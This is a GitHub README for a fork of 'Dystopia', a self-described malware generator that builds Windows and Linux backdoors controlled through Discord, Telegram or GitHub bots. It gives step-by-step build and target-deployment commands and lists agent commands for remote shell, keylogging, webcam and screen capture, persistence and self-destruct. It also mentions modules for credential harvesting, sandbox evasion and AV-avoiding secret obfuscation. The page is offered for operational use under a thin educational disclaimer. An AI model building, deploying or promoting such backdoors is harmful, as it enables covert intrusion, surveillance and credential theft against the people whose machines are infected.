<h1 align="center">
  <br>
  <a href="https://github.com/3ct0s/"><img src="https://i.ibb.co/qY09wWK/download-2.png" width=600 weigth=500 alt="Dystopia"></a>
  <br>
  Dystopia
  <br>
</h1>

<h4 align="center">Dystopia Command and Control</h4>

<p align="center">
    <img src="https://img.shields.io/badge/Backdoor_Platform-Windows_%7C_Linux-blue">
    <img src="https://img.shields.io/badge/Version-3.0-blue">
    <img src="https://img.shields.io/badge/Python-3.8+-blue">
</p>

---

> **Fork note:** this fork ([TarzEH/dystopia-c2](https://github.com/TarzEH/dystopia-c2)) adds Linux agent support, AES-256-GCM secret obfuscation, operator allowlist, batch builds, and a unified builder on top of the original [3ct0s/dystopia-c2](https://github.com/3ct0s/dystopia-c2). See [Fork additions](#fork-additions) below.

## What is Dystopia?

Dystopia is a malware generator that generates backdoors which use online platforms as C2s. This includes Discord, Telegram and Github. 

Our goal is to prove that anything can be a C2, if you want to :) ...

## How does it work?

The Dystopia backdoors are using libraries which allow the backdoor to act as a "Bot" for the above-mentioned platforms. Essentially the attacker contacts the bot and specifies a malicious command to execute on the target "Agent". 

Dystopia is equipped with a lot of features **some** of which are:
- Encrypted traffic (HTTPS)
- Running system commands on target Agent
- Keylogger (Limited to Discord)
- Grabbing webcam snaps
- Multiple online agents at a time (Limited to Discord & GitHub)

## Installation and Usage

Dystopia is better installed and used on Kali Linux:
```
git clone https://github.com/3ct0s/Dystopia-c2
cd ./Dystopia-c2
chmod +x setup.sh
./setup.sh
```
Once this is done we can use the builder. Let's build a discord based C2 backdoor:
```
python builder.py
use discord
set name <backdoor-name>
set guild-id <server id from discord>
set bot-token <discord bot token>
set channel-id <channel id from discord server>
set webhook <discord webhook>
build
```

## How to Setup Dystopia
Since the setup process is very specific for each platform:

> Please follow the [setup guide](https://github.com/3ct0s/dystopia-c2/wiki/) to setup Dystopia.

## Contributors
Contributions are welcome to our GitHub repo! We value community involvement and appreciate all types of contributions, from bug reports to code. Join us in building something great and making a positive impact on the world. Get involved today!

## Disclaimer
This github repository is made for educational purposes only. The developer is not responsible for any misuse of this software. **Do not use this software for illegal purposes.**

---

# Fork Additions

The sections below document features added in this fork ([TarzEH/dystopia-c2](https://github.com/TarzEH/dystopia-c2)).

## New Features

- **Windows + Linux** agent targets
- **AES-256-GCM** secret obfuscation in packaged agents (default on)
- **Operator allowlist** — fail-closed; empty allowlist blocks builds and denies commands
- **Interactive REPL** or **batch/automation** mode (`--env` / `--batch`)
- Shell commands, keylogger (Discord), screenshot, webcam, file upload/download, persistence, self-destruct

## Fork Installation

```bash
git clone https://github.com/TarzEH/dystopia-c2.git
cd dystopia-c2

python3 -m venv .venv
source .venv/bin/activate
pip install -U pip
pip install -r requirements.txt
```

**Windows EXE builds** additionally require Wine + Python 3.8.9 (win32) under Wine + PyInstaller. See the upstream wiki for the Wine toolchain setup.

## Discord Setup (Quick)

1. [Developer Portal](https://discord.com/developers/applications) → New Application → Bot
2. Enable **Message Content Intent**
3. Set **Public Bot** → OFF
4. Set **Default Authorization Link** → None
5. Invite bot to a **private** guild with: Send Messages, Embed Links, Attach Files, Read Message History
6. Create a `#keylogger` channel → add a Webhook (for keylog reports)
7. Copy: Guild ID, Channel ID, Bot Token, Webhook URL, your User ID

## Configuration

Copy the example env and fill in your values:

```bash
cp discord.env.example discord.env
chmod 600 discord.env
# Edit discord.env with your Discord credentials
```

Or use the system-wide path:

```bash
sudo mkdir -p /etc/dystopia
sudo cp discord.env.example /etc/dystopia/discord.env
sudo chmod 600 /etc/dystopia/discord.env
```

See [`discord.env.example`](discord.env.example) for all available options.

**Never commit `discord.env` or any file containing real tokens.** The `.gitignore` already excludes `*.env` (except `*.env.example`).

## Usage (Fork)

### Interactive

```bash
.venv/bin/python builder.py
```

```
use discord
set target linux
set name my-agent
set guild-id <GUILD_ID>
set bot-token <BOT_TOKEN>
set channel-id <CHANNEL_ID>
set webhook <WEBHOOK_URL>
set operator-ids <YOUR_USER_ID>
set obfuscate true
build
```

### Batch / Automation

```bash
# From env file
.venv/bin/python builder.py --env discord.env

# Or from default path (/etc/dystopia/discord.env)
.venv/bin/python builder.py --batch
```

### Build Output

| Target | Pack | Output |
|--------|------|--------|
| Linux | `script` (default) | `dist/<name>-linux/` → `agent.py`, `run.sh`, `libraries/`, `requirements.txt` |
| Linux | `onefile` | `dist/<name>` (single ELF binary via PyInstaller) |
| Windows | `auto` / `exe` | `dist/<name>.exe` (PyInstaller under Wine) |

### Deploy (Linux Script Pack)

```bash
# On target machine
cd dist/<name>-linux/
pip install -r requirements.txt
python3 agent.py
# Or simply:
./run.sh
```

## Agent Commands (Discord)

| Command | Description |
|---------|-------------|
| `!ls` | List online agents |
| `!interact <id>` | Select an agent |
| `!cmd <command>` | Run shell command |
| `!keylog start <interval>` | Start keylogger (reports to webhook channel) |
| `!keylog stop` | Stop keylogger |
| `!screenshot` | Capture screen |
| `!upload <url> <name>` | Download file to target |
| `!persist` | Install persistence |
| `!selfdestruct` | Remove agent from target |
| `!info` | Agent system info |
| `!help` | Full command list |

> One bot token = one live gateway session. Don't run two agents with the same token simultaneously.

## File Structure

```
builder.py              # Unified builder (interactive + batch)
discord.env.example     # Env template (safe to commit)
requirements.txt        # All dependencies (builder + agent runtime)
code/
  discord/
    main.py             # Windows Discord agent template
    main_linux.py       # Linux Discord agent template
  telegram/main.py      # Telegram agent template
  github/main.py        # GitHub agent template
libraries/
  build_api.py          # Build logic (Win + Linux packing)
  obfuscate_build.py    # Build-time AES-256-GCM encryption
  secretbox.py          # Runtime secret decryption
  disctopia.py          # Windows agent ops
  linuxops.py           # Linux agent ops
  keylogger.py          # Windows keylogger
  keylogger_linux.py    # Linux keylogger (evdev)
  credentials.py        # Windows credential harvesting
  sandboxevasion.py     # Sandbox/VM detection
img/exe_file.ico        # Windows EXE icon
```

## Security Notes

- **Operator allowlist is mandatory** — empty `DISCORD_OPERATOR_IDS` blocks the build
- **Obfuscation is on by default** — secrets are AES-encrypted in the agent; `obfuscate=false` is debug-only
- Treat `dist/` output as credential-equivalent — never upload to VirusTotal or share publicly
- Keep bot token in a `chmod 600` env file; rotate immediately if leaked
- Use a **dedicated private guild** — never reuse personal servers
